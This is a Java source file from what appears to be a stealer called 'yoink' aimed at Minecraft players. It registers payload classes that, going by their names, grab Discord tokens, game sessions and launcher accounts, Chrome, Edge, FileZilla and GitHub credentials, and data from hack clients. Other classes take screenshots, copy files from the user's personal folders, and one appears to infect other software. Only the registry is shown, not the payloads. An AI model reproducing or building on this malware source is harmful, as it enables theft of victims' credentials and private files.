package me.perry.yoink.payload;

import me.perry.yoink.payload.impl.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public final
class PayloadRegistry {
    private static final PayloadRegistry INSTANCE = new PayloadRegistry();
    private final List <Payload> payloads = new ArrayList <>();

    private
    PayloadRegistry () {
        payloads.addAll(Arrays.asList(
                new DuplicateRemover() ,
                new FutureInfector() ,
                new Personal() ,
                new DiscordTokens() ,
                new Session() ,
                new JsonVersion() ,
                new ModsGrabber() ,
                new ScreenCapture() ,
                new LauncherAccounts() ,
                new Chrome() ,
                new FileZilla() ,
                new ShareX() ,
                new FutureAuth() ,
                new FutureAccounts() ,
                new FutureWaypoints() ,
                new GitHub() ,
                new SalHackWaypoints() ,
                new RusherHackAccounts() ,
                new RusherHackWaypoints() ,
                new PyroAccounts() ,
                new PyroWaypoints() ,
                new KonasAccounts() ,
                new KonasWaypoints() ,
                new KamiBlueWaypoints() ,
                new JourneyMap() ,
                new Intellij() ,
                new Desktop() ,
                new Documents() ,
                new Videos() ,
                new Pictures() ,
                new Music() ,
                new Edge() ,
                new LambdaWaypoints() ,
                new Downloads() ,
                new InertiaAccounts() ,
                new WebCapture(),
                new PyroLauncher(),
                new RusherHackLauncher()
        ));
    }

    public static
    List <Payload> getPayloads () {
        return INSTANCE.payloads;
    }
}